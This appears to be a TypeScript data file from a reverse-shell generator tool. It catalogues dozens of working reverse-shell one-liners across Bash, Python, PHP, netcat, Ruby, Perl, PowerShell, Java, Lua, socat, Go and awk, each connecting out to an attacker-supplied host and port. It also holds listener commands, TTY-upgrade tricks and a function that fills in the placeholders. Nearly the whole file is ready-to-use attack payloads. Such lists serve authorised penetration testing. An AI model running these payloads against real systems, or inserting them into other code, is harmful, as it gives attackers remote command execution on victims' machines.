/**
 * 反弹 Shell 模板数据
 * 模板中使用 {{LHOST}} 和 {{LPORT}} 作为占位符
 * 其余 {{VAR}} 占位符可通过全局变量系统自动替换
 */
import { useGlobalVars } from "@/store/globalVars"

export interface ShellTemplate {
    id: string
    name: string
    language: string
    template: string
    platform: "linux" | "windows" | "both"
}

export interface ShellCategory {
    name: string
    shells: ShellTemplate[]
}

export const shellCategories: ShellCategory[] = [
    {
        name: "Bash",
        shells: [
            {
                id: "bash-i",
                name: "Bash -i",
                language: "bash",
                platform: "linux",
                template: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`,
            },
            {
                id: "bash-196",
                name: "Bash 196",
                language: "bash",
                platform: "linux",
                template: `0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196`,
            },
            {
                id: "bash-read-line",
                name: "Bash read line",
                language: "bash",
                platform: "linux",
                template: `exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done`,
            },
            {
                id: "bash-5",
                name: "Bash 5",
                language: "bash",
                platform: "linux",
                template: `bash -i 5<> /dev/tcp/{{LHOST}}/{{LPORT}} 0<&5 1>&5 2>&5`,
            },
            {
                id: "bash-udp",
                name: "Bash UDP",
                language: "bash",
                platform: "linux",
                template: `sh -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1`,
            },
        ],
    },
    {
        name: "Python",
        shells: [
            {
                id: "python3-shortest",
                name: "Python3 shortest",
                language: "python",
                platform: "both",
                template: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
            },
            {
                id: "python3-1",
                name: "Python3 #1",
                language: "python",
                platform: "both",
                template: `export RHOST="{{LHOST}}";export RPORT={{LPORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`,
            },
            {
                id: "python3-2",
                name: "Python3 #2",
                language: "python",
                platform: "both",
                template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
            },
            {
                id: "python2-1",
                name: "Python2 #1",
                language: "python",
                platform: "linux",
                template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
            },
        ],
    },
    {
        name: "PHP",
        shells: [
            {
                id: "php-exec",
                name: "PHP exec",
                language: "php",
                platform: "both",
                template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("sh <&3 >&3 2>&3");'`,
            },
            {
                id: "php-shell-exec",
                name: "PHP shell_exec",
                language: "php",
                platform: "both",
                template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});shell_exec("sh <&3 >&3 2>&3");'`,
            },
            {
                id: "php-system",
                name: "PHP system",
                language: "php",
                platform: "both",
                template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});system("sh <&3 >&3 2>&3");'`,
            },
            {
                id: "php-passthru",
                name: "PHP passthru",
                language: "php",
                platform: "both",
                template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});passthru("sh <&3 >&3 2>&3");'`,
            },
            {
                id: "php-popen",
                name: "PHP popen",
                language: "php",
                platform: "both",
                template: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});popen("sh <&3 >&3 2>&3", "r");'`,
            },
        ],
    },
    {
        name: "Netcat",
        shells: [
            {
                id: "nc-mkfifo",
                name: "nc mkfifo",
                language: "bash",
                platform: "linux",
                template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f`,
            },
            {
                id: "nc-e-sh",
                name: "nc -e sh",
                language: "bash",
                platform: "linux",
                template: `nc {{LHOST}} {{LPORT}} -e sh`,
            },
            {
                id: "nc-e-bash",
                name: "nc -e bash",
                language: "bash",
                platform: "linux",
                template: `nc {{LHOST}} {{LPORT}} -e bash`,
            },
            {
                id: "nc-c-bash",
                name: "nc -c bash",
                language: "bash",
                platform: "linux",
                template: `nc -c bash {{LHOST}} {{LPORT}}`,
            },
            {
                id: "ncat-e-bash",
                name: "ncat -e bash",
                language: "bash",
                platform: "linux",
                template: `ncat {{LHOST}} {{LPORT}} -e bash`,
            },
            {
                id: "ncat-udp",
                name: "ncat udp",
                language: "bash",
                platform: "linux",
                template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {{LHOST}} {{LPORT}} >/tmp/f`,
            },
        ],
    },
    {
        name: "Ruby",
        shells: [
            {
                id: "ruby-1",
                name: "Ruby #1",
                language: "ruby",
                platform: "both",
                template: `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{{LHOST}}",{{LPORT}}))'`,
            },
            {
                id: "ruby-2",
                name: "Ruby #2",
                language: "ruby",
                platform: "linux",
                template: `ruby -rsocket -e'f=TCPSocket.open("{{LHOST}}",{{LPORT}}).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'`,
            },
        ],
    },
    {
        name: "Perl",
        shells: [
            {
                id: "perl-1",
                name: "Perl #1",
                language: "perl",
                platform: "both",
                template: `perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
            },
            {
                id: "perl-2",
                name: "Perl no sh",
                language: "perl",
                platform: "both",
                template: `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{{LHOST}}:{{LPORT}}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
            },
        ],
    },
    {
        name: "PowerShell",
        shells: [
            {
                id: "powershell-1",
                name: "PowerShell #1",
                language: "powershell",
                platform: "windows",
                template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
            },
            {
                id: "powershell-2",
                name: "PowerShell #2",
                language: "powershell",
                platform: "windows",
                template: `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{{LHOST}}', {{LPORT}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,
            },
            {
                id: "powershell-base64",
                name: "PowerShell Base64",
                language: "powershell",
                platform: "windows",
                template: `powershell -e {{BASE64_PAYLOAD}}`,
            },
        ],
    },
    {
        name: "Java",
        shells: [
            {
                id: "java-runtime",
                name: "Java Runtime",
                language: "java",
                platform: "both",
                template: `Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do \\$line 2>&5 >&5; done'");
p.waitFor();`,
            },
            {
                id: "java-runtime-2",
                name: "Java #2",
                language: "java",
                platform: "both",
                template: `String host="{{LHOST}}";
int port={{LPORT}};
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
            },
        ],
    },
    {
        name: "Groovy",
        shells: [
            {
                id: "groovy-1",
                name: "Groovy",
                language: "groovy",
                platform: "both",
                template: `String host="{{LHOST}}";int port={{LPORT}};String cmd="bash";Process p=["bash","-c",cmd," &>/dev/tcp/\${host}/\${port} 0>&1"].execute()`,
            },
        ],
    },
    {
        name: "Lua",
        shells: [
            {
                id: "lua-1",
                name: "Lua #1",
                language: "lua",
                platform: "linux",
                template: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{{LHOST}}','{{LPORT}}');os.execute('sh -i <&3 >&3 2>&3');"`,
            },
            {
                id: "lua-5-1",
                name: "Lua 5.1",
                language: "lua",
                platform: "linux",
                template: `lua5.1 -e 'local host, port = "{{LHOST}}", {{LPORT}} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,
            },
        ],
    },
    {
        name: "Socat",
        shells: [
            {
                id: "socat-1",
                name: "Socat #1",
                language: "bash",
                platform: "linux",
                template: `socat TCP:{{LHOST}}:{{LPORT}} EXEC:sh`,
            },
            {
                id: "socat-tty",
                name: "Socat TTY",
                language: "bash",
                platform: "linux",
                template: `socat TCP:{{LHOST}}:{{LPORT}} EXEC:'bash',pty,stderr,setsid,sigint,sane`,
            },
        ],
    },
    {
        name: "Golang",
        shells: [
            {
                id: "golang-1",
                name: "Golang",
                language: "go",
                platform: "both",
                template: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{{LHOST}}:{{LPORT}}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
            },
        ],
    },
    {
        name: "Awk",
        shells: [
            {
                id: "awk-1",
                name: "Awk",
                language: "bash",
                platform: "linux",
                template: `awk 'BEGIN {s = "/inet/tcp/0/{{LHOST}}/{{LPORT}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
            },
        ],
    },
]

/**
 * 监听端命令
 */
export const listenerCommands = [
    {
        name: "nc",
        command: `nc -lvnp {{LPORT}}`,
    },
    {
        name: "rlwrap + nc",
        command: `rlwrap nc -lvnp {{LPORT}}`,
    },
    {
        name: "pwncat",
        command: `python3 -m pwncat -lp {{LPORT}}`,
    },
    {
        name: "socat",
        command: `socat -d -d TCP-LISTEN:{{LPORT}} STDOUT`,
    },
    {
        name: "socat TTY",
        command: `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:{{LPORT}}`,
    },
]

/**
 * TTY Shell 升级命令
 */
export const ttyUpgradeCommands = [
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    `python -c 'import pty; pty.spawn("/bin/bash")'`,
    `script -qc /bin/bash /dev/null`,
    `/usr/bin/script -qc /bin/bash /dev/null`,
    `perl -e 'exec "/bin/bash";'`,
    `ruby -e 'exec "/bin/bash"'`,
    `lua -e 'os.execute("/bin/bash")'`,
]

/**
 * 渲染模板，替换占位符
 *
 * 优先使用显式传入的 lhost/lport 参数（工具页面的输入值）；
 * 其余未匹配的 {{VAR}} 占位符回退到全局变量系统进行替换。
 */
export function renderTemplate(template: string, lhost: string, lport: string): string {
    // 第一步：替换显式传入的值（向后兼容）
    let result = template
        .replace(/\{\{LHOST\}\}/g, lhost || "LHOST")
        .replace(/\{\{LPORT\}\}/g, lport || "LPORT")

    // 第二步：剩余的 {{VAR}} 占位符尝试用全局变量替换
    try {
        const { replaceVars } = useGlobalVars()
        result = replaceVars(result)
    } catch {
        // 全局变量系统不可用时静默忽略
    }

    return result
}
